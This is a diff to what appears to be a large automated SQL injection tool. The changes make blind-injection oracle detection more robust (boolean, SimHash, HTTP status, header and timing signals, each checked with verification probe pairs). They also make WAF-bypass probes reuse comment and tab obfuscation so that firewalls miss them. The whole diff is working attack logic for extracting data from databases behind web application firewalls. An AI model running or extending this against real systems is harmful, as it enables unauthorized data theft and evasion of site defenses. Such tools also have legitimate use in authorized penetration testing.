@@ -58777,14 +58777,34 @@ class Scanner:
                         # Rationale: On small pages, even 0.5% (3B on 660B) can be meaningful injection signal
                         # Guard: skip if both probes are WAF-blocked (same WAF page with different sizes = noise)
                         # Guard: skip if both probes return the same error status (different error bodies ≠ oracle)
-                        _boolean_oracle = True
-                        _bool_true_len = len(_true_body)
-                        _bool_false_len = len(_false_body)
-                        _bool_norm_true = ResponseNormaliser.normalise(_extract_body_safe(fp_true)) if _validate_response(fp_true, allow_empty=True) else b""
-                        _bool_norm_false = ResponseNormaliser.normalise(_extract_body_safe(fp_false)) if _validate_response(fp_false, allow_empty=True) else b""
-                        LOG.info("[Inference]  BOOLEAN ORACLE detected! body size %dB vs %dB "
-                                 "(%.1f%% diff, attempt %d, small-page threshold)",
-                                 len(_true_body), len(_false_body), _size_pct, _bool_oracle_attempts)
+                        # BUG-BOOL-HASH-UNSTABLE-STABILITY FIX: Hash-unstable path had no stability check —
+                        # on dynamic pages with natural 2-5% size variation (A/B tests, ad rotators, session
+                        # content), a single calibration pair showing size difference set _boolean_oracle=True,
+                        # causing extraction to evaluate every bit against random noise baseline.
+                        # Fix: send one additional pair and require SAME-DIRECTION size difference at ≥5% threshold.
+                        # If the stability pair disagrees or size drops below 5%, fall through to Wasserstein.
+                        _hus_stab_t, _ = await _send_payload(_cal_true_cond)
+                        await asyncio.sleep(_delay * 0.2)
+                        _hus_stab_f, _ = await _send_payload(_cal_false_cond)
+                        _hus_stab_tb = _safe_decode_body(_hus_stab_t, encoding="utf-8", errors="replace", func_name="extraction") if (_hus_stab_t and _hus_stab_t.body) else ""
+                        _hus_stab_fb = _safe_decode_body(_hus_stab_f, encoding="utf-8", errors="replace", func_name="extraction") if (_hus_stab_f and _hus_stab_f.body) else ""
+                        _hus_stab_diff = abs(len(_hus_stab_tb) - len(_hus_stab_fb))
+                        _hus_stab_max = max(len(_hus_stab_tb), len(_hus_stab_fb), 1)
+                        _hus_stab_pct = _hus_stab_diff / _hus_stab_max
+                        _hus_stab_same_dir = (len(_hus_stab_tb) > len(_hus_stab_fb)) == (len(_true_body) > len(_false_body))
+                        if _hus_stab_pct >= 0.05 and _hus_stab_same_dir:
+                            _boolean_oracle = True
+                            _bool_true_len = len(_true_body)
+                            _bool_false_len = len(_false_body)
+                            _bool_norm_true = ResponseNormaliser.normalise(_extract_body_safe(fp_true)) if _validate_response(fp_true, allow_empty=True) else b""
+                            _bool_norm_false = ResponseNormaliser.normalise(_extract_body_safe(fp_false)) if _validate_response(fp_false, allow_empty=True) else b""
+                            LOG.info("[Inference]  BOOLEAN ORACLE detected! body size %dB vs %dB "
+                                     "(%.1f%% diff, stable=%.1f%%, attempt %d, hash-unstable path)",
+                                     len(_true_body), len(_false_body), _size_pct, _hus_stab_pct*100, _bool_oracle_attempts)
+                        else:
+                            LOG.info("[Inference] Hash-unstable size-diff UNSTABLE (%.1f%% then %.1f%%, "
+                                     "same_dir=%s) — dynamic page noise, not oracle",
+                                     _size_pct, _hus_stab_pct*100, _hus_stab_same_dir)
                     else:
                         LOG.info("[Inference] Hash differs but unstable (dynamic page noise: "
                                  "%dB vs %dB = %.1f%%, hash changes on resend)  not a real oracle",
@@ -58795,11 +58815,27 @@ class Scanner:
                         ResponseNormaliser.normalise(_extract_body_safe(fp_true)) if _validate_response(fp_true, allow_empty=True) else b"",
                         ResponseNormaliser.normalise(_extract_body_safe(fp_false)) if _validate_response(fp_false, allow_empty=True) else b"")
                     if _sim_tf < 0.92 and not _both_waf_blocked and not _same_error_status:
-                        _boolean_oracle = True
-                        _bool_norm_true = ResponseNormaliser.normalise(_extract_body_safe(fp_true)) if _validate_response(fp_true, allow_empty=True) else b""
-                        _bool_norm_false = ResponseNormaliser.normalise(_extract_body_safe(fp_false)) if _validate_response(fp_false, allow_empty=True) else b""
-                        LOG.info("[Inference]  BOOLEAN ORACLE detected! SimHash sim=%.3f (attempt %d)",
-                                 _sim_tf, _bool_oracle_attempts)
+                        # BUG-BOOL-SIMHASH-STABILITY FIX: SimHash fires on a single probe pair —
+                        # dynamic pages with rotating content blocks can show sim<0.92 between any
+                        # two consecutive requests regardless of SQL condition.  Send a verification
+                        # pair and require the same-direction similarity drop before accepting.
+                        _ssh_vt, _ = await _send_payload(_cal_true_cond)
+                        await asyncio.sleep(_delay * 0.2)
+                        _ssh_vf, _ = await _send_payload(_cal_false_cond)
+                        _ssh_norm_vt = ResponseNormaliser.normalise(_extract_body_safe(_ssh_vt)) if (_ssh_vt and _validate_response(_ssh_vt, allow_empty=True)) else b""
+                        _ssh_norm_vf = ResponseNormaliser.normalise(_extract_body_safe(_ssh_vf)) if (_ssh_vf and _validate_response(_ssh_vf, allow_empty=True)) else b""
+                        _sim_tf_v = SimHasher.body_similarity(_ssh_norm_vt, _ssh_norm_vf)
+                        # Both pairs must show structural difference; single-pair variation is noise
+                        if _sim_tf_v < 0.92:
+                            _boolean_oracle = True
+                            _bool_norm_true = ResponseNormaliser.normalise(_extract_body_safe(fp_true)) if _validate_response(fp_true, allow_empty=True) else b""
+                            _bool_norm_false = ResponseNormaliser.normalise(_extract_body_safe(fp_false)) if _validate_response(fp_false, allow_empty=True) else b""
+                            LOG.info("[Inference]  BOOLEAN ORACLE detected! SimHash sim=%.3f (verif=%.3f, attempt %d)",
+                                     _sim_tf, _sim_tf_v, _bool_oracle_attempts)
+                        else:
+                            LOG.info("[Inference] SimHash sim=%.3f but verification pair sim=%.3f ≥ 0.92 "
+                                     "— rotating content (dynamic page), not boolean oracle",
+                                     _sim_tf, _sim_tf_v)
         if not _boolean_oracle:
             LOG.info("[Inference] Boolean oracle not detected after %d attempts", _bool_oracle_attempts)
 
@@ -58860,6 +58896,44 @@ class Scanner:
                         print(f"[+] [Inference]  BOOLEAN ORACLE detected via Wasserstein! "
                               f"dist={_wass_mean:.3f} (n={len(_wass_dists)} pairs)", flush=True)
 
+        # STATUS CODE ORACLE: WAF-selective blocking produces different HTTP status codes
+        # for true vs false SQL conditions (e.g. AND 1=1→200, AND 1=2→403) even when
+        # body content is identical. This fires when body/hash/Wasserstein all fail on
+        # dynamic pages but the WAF's condition-sensitive rate-limiting creates a detectable
+        # status difference. One true=X, false=Y, verification pair required for stability.
+        _bool_status_true = None
+        _bool_status_false = None
+        if not _boolean_oracle and fp_true and fp_false:
+            _sco_true = getattr(fp_true, 'status_code', 0)
+            _sco_false = getattr(fp_false, 'status_code', 0)
+            # Guard: status codes must differ, both valid, and not both error codes
+            # (both-error = different WAF pages for different malformed inputs, not SQL signal)
+            _sco_different = _sco_true != _sco_false and _sco_true > 0 and _sco_false > 0
+            _sco_both_error = _sco_true >= 400 and _sco_false >= 400
+            if _sco_different and not _sco_both_error:
+                # Stability verification: resend both conditions, require same status codes
+                _sco_vt, _ = await _send_payload(_cal_true_cond)
+                await asyncio.sleep(_delay * 0.15)
+                _sco_vf, _ = await _send_payload(_cal_false_cond)
+                _sco_vt_sc = getattr(_sco_vt, 'status_code', 0)
+                _sco_vf_sc = getattr(_sco_vf, 'status_code', 0)
+                if _sco_vt_sc == _sco_true and _sco_vf_sc == _sco_false:
+                    _boolean_oracle = True
+                    _bool_status_true = _sco_true
+                    _bool_status_false = _sco_false
+                    # Use verification pair bodies as the oracle baseline
+                    _bool_norm_true = (ResponseNormaliser.normalise(_extract_body_safe(_sco_vt))
+                                      if _sco_vt and _validate_response(_sco_vt, allow_empty=True) else b"")
+                    _bool_norm_false = (ResponseNormaliser.normalise(_extract_body_safe(_sco_vf))
+                                       if _sco_vf and _validate_response(_sco_vf, allow_empty=True) else b"")
+                    LOG.info("[Inference]  STATUS CODE ORACLE detected! true=%d vs false=%d (stable)",
+                             _sco_true, _sco_false)
+                    print(f"[+] [Inference] STATUS CODE ORACLE: true={_sco_true} false={_sco_false} — stable",
+                          flush=True)
+                else:
+                    LOG.info("[Inference] Status code difference unstable (true=%d→%d, false=%d→%d) — transient, not oracle",
+                             _sco_true, _sco_vt_sc, _sco_false, _sco_vf_sc)
+
         #  HEADER ORACLE: For BH (header boolean-blind) technique
         # BH produces same status+body but DIFFERENT response headers.
         # Check for stable header differences between true/false probes.
@@ -58917,12 +58991,40 @@ class Scanner:
                 _hv_t = _ht.get(_hk, "")
                 _hv_f = _hf.get(_hk, "")
                 if _hv_t != _hv_f:
-                    _bool_hdr_name = _hk
-                    _bool_hdr_true = _hv_t
-                    _bool_hdr_false = _hv_f
-                    _boolean_oracle = True
-                    LOG.info("[Inference]  HEADER ORACLE detected! %s=%r vs %r (BH extraction possible)",
-                             _hk, _hv_t[:40], _hv_f[:40])
+                    # BUG-HDR-ORACLE-STABILITY FIX: Single probe-pair header difference set
+                    # _boolean_oracle=True without verification. Per-request headers not in
+                    # _HDR_SKIP (e.g. custom 'x-response-time', 'x-processing-time',
+                    # 'x-request-start', or app-specific tracking headers) vary naturally between
+                    # any two consecutive requests — not due to SQL condition difference.
+                    # A single mismatched header fired the oracle → extraction evaluated bits
+                    # against a noisy channel → garbage extraction output.
+                    # Fix: send one additional pair and require BOTH the header to differ in the
+                    # same direction AND the SAME header to differ in the verification pair.
+                    _hdr_stab_t, _ = await _send_payload(_cal_true_cond)
+                    await asyncio.sleep(_delay * 0.2)
+                    _hdr_stab_f, _ = await _send_payload(_cal_false_cond)
+                    _ht_stab = {k.lower(): v for k, v in (getattr(_hdr_stab_t, "headers", {}) or {}).items()}
+                    _hf_stab = {k.lower(): v for k, v in (getattr(_hdr_stab_f, "headers", {}) or {}).items()}
+                    _hv_t_stab = _ht_stab.get(_hk, "")
+                    _hv_f_stab = _hf_stab.get(_hk, "")
+                    # Accept oracle only if: same header differs in verification pair too, AND
+                    # the true and false values are still stable across both pairs.
+                    _hdr_stab_oracle = (
+                        _hv_t_stab != _hv_f_stab          # still differs on same header
+                        and _hv_t_stab == _hv_t            # true value stable
+                        and _hv_f_stab == _hv_f            # false value stable
+                    )
+                    if _hdr_stab_oracle:
+                        _bool_hdr_name = _hk
+                        _bool_hdr_true = _hv_t
+                        _bool_hdr_false = _hv_f
+                        _boolean_oracle = True
+                        LOG.info("[Inference]  HEADER ORACLE detected! %s=%r vs %r (stable, BH extraction possible)",
+                                 _hk, _hv_t[:40], _hv_f[:40])
+                    else:
+                        LOG.info("[Inference] Header %r differs (%r vs %r) but UNSTABLE "
+                                 "(stab: %r vs %r) — per-request noise, not injection signal",
+                                 _hk, _hv_t[:30], _hv_f[:30], _hv_t_stab[:20], _hv_f_stab[:20])
                     break
 
         _try_bitwise_deferred = False
@@ -129804,8 +129906,13 @@ class TechniqueCascadeEngine:
                                 data_fmt, param, original + payload, self.tamper_chain,
                                 bypass_mutation=True)  # BUG-DEDUP-MULTIPROBE FIX
                             self._total_reqs += 1
-                            _bt_mp3_ok = (_bt_mp3 and _bt_mp3.elapsed_ms > fp_f.elapsed_ms * 1.5)
+                            # FIX-BT-P3-THRESHOLD: Previously `fp_f.elapsed_ms * 1.5` — too loose.
+                            # If false probe=200ms, threshold=300ms, any server processing >300ms
+                            # passes even without injection. Use time_threshold (baseline+sleep*0.75)
+                            # which correctly requires the probe to reach near the sleep value.
+                            _bt_mp3_ok = (_bt_mp3 and _bt_mp3.elapsed_ms >= time_threshold)
                             print(f"    [BT-multi] probe 3/3: {_bt_mp3.elapsed_ms:.0f}ms "
+                                  f"thresh={time_threshold:.0f}ms "
                                   f"{' slow' if _bt_mp3_ok else ' fast'}" if _bt_mp3 else "    [BT-multi] error")
                             if _bt_mp3_ok:
                                 _det_bt2 = DetectionResult(
@@ -152008,8 +152115,17 @@ class ExtractionBypassFinder:
                     thresh = _thresh_cap_a
                 print(f"[+] [EBF] structural bypass: true={elapsed:.0f}ms "
                          f"false={_elapsed_false:.0f}ms thresh={thresh:.0f}ms tc={tc}", flush=True)
+                # FIX-EBF-P2-MUTATION: Phase 1 confirmed bypass via `mutated` which has
+                # inline text mutations (spaces→/**/, spaces→\t) applied on top of tc.
+                # Phase 2 previously sent raw tmpl.format(cond=...) WITHOUT those mutations —
+                # WAF blocked Phase 2 probes for the same conditions Phase 1 confirmed working,
+                # because the structural obfuscation pattern differed from Phase 1.
+                # Fix: detect which inline mutations Phase 1 applied and reuse them in all
+                # Phase 2 and Phase 2.5 probes so the WAF sees the same bypass pattern.
+                _p2_mut_comments = "/**/" in mutated and "/**/" not in cal_payload
+                _p2_mut_tabs = "\t" in mutated and "\t" not in cal_payload
 
-                #  Phase 2: condition wrapper  obfuscation tag matrix 
+                #  Phase 2: condition wrapper  obfuscation tag matrix
                 # Try every (wrapper, obfuscation_tag) combination.
                 # Obfuscation splits function names with inline comments
                 # so WAF pattern-matches on "identifier(" miss the split form.
@@ -152034,6 +152150,11 @@ class ExtractionBypassFinder:
                     for (_always_true, _tag) in _cond_tests:
                         _wc = _wrap.format(cond=_always_true)
                         _wp = tmpl.format(cond=_wc)
+                        # FIX-EBF-P2-MUTATION: apply same inline mutations as Phase 1 bypass
+                        if _p2_mut_comments:
+                            _wp = _re.sub(r" ", "/**/", _wp)
+                        if _p2_mut_tabs:
+                            _wp = _wp.replace(" ", "\t")
                         await asyncio.sleep(0.3)  # pace phase-2 to avoid rate-limit buildup
                         _t0w = time.monotonic()
                         try:
@@ -152050,6 +152171,11 @@ class ExtractionBypassFinder:
                             # the false condition will also be slow  reject.
                             _false_cond = _wrap.format(cond=_ebf_p1_false)
                             _false_p    = tmpl.format(cond=_false_cond)
+                            # FIX-EBF-P2-MUTATION: apply same inline mutations as Phase 1 bypass
+                            if _p2_mut_comments:
+                                _false_p = _re.sub(r" ", "/**/", _false_p)
+                            if _p2_mut_tabs:
+                                _false_p = _false_p.replace(" ", "\t")
                             _t0_false = time.monotonic()
                             try:
                                 await _send_injected(
@@ -152163,6 +152289,11 @@ class ExtractionBypassFinder:
                                     _fc_probe_dbms, _p25_tag)
                                 _p25_obf_wc = _upg_wrap.format(cond=_p25_obf)
                                 _p25_obf_wp = tmpl.format(cond=_p25_obf_wc)
+                                # FIX-EBF-P2-MUTATION: apply Phase 1 inline mutations to p2.5(A) probe
+                                if _p2_mut_comments:
+                                    _p25_obf_wp = _re.sub(r" ", "/**/", _p25_obf_wp)
+                                if _p2_mut_tabs:
+                                    _p25_obf_wp = _p25_obf_wp.replace(" ", "\t")
                                 await asyncio.sleep(0.3)
                                 _t0p25 = time.monotonic()
                                 try:
@@ -152176,6 +152307,11 @@ class ExtractionBypassFinder:
                                 if _ep25 > _p25_thresh:
                                     _p25_false_wc = _upg_wrap.format(cond=_ebf_p1_false)
                                     _p25_false_wp = tmpl.format(cond=_p25_false_wc)
+                                    # FIX-EBF-P2-MUTATION: apply Phase 1 inline mutations to p2.5(A) false probe
+                                    if _p2_mut_comments:
+                                        _p25_false_wp = _re.sub(r" ", "/**/", _p25_false_wp)
+                                    if _p2_mut_tabs:
+                                        _p25_false_wp = _p25_false_wp.replace(" ", "\t")
                                     _t0p25f = time.monotonic()
                                     try:
                                         await _send_injected(
@@ -152210,6 +152346,11 @@ class ExtractionBypassFinder:
                         # function call into a subquery that WAFs inspect less strictly.
                         _p25_sub_wc = _upg_wrap.format(cond=_fc_probe_dbms)
                         _p25_sub_wp = tmpl.format(cond=_p25_sub_wc)
+                        # FIX-EBF-P2-MUTATION: apply Phase 1 inline mutations to p2.5(B) probe
+                        if _p2_mut_comments:
+                            _p25_sub_wp = _re.sub(r" ", "/**/", _p25_sub_wp)
+                        if _p2_mut_tabs:
+                            _p25_sub_wp = _p25_sub_wp.replace(" ", "\t")
                         await asyncio.sleep(0.3)
                         _t0p25s = time.monotonic()
                         try:
@@ -152223,6 +152364,11 @@ class ExtractionBypassFinder:
                         if _ep25s > _p25_thresh:
                             _p25s_false_wc = _upg_wrap.format(cond=_ebf_p1_false)
                             _p25s_false_wp = tmpl.format(cond=_p25s_false_wc)
+                            # FIX-EBF-P2-MUTATION: apply Phase 1 inline mutations to p2.5(B) false probe
+                            if _p2_mut_comments:
+                                _p25s_false_wp = _re.sub(r" ", "/**/", _p25s_false_wp)
+                            if _p2_mut_tabs:
+                                _p25s_false_wp = _p25s_false_wp.replace(" ", "\t")
                             _t0p25sf = time.monotonic()
                             try:
                                 await _send_injected(
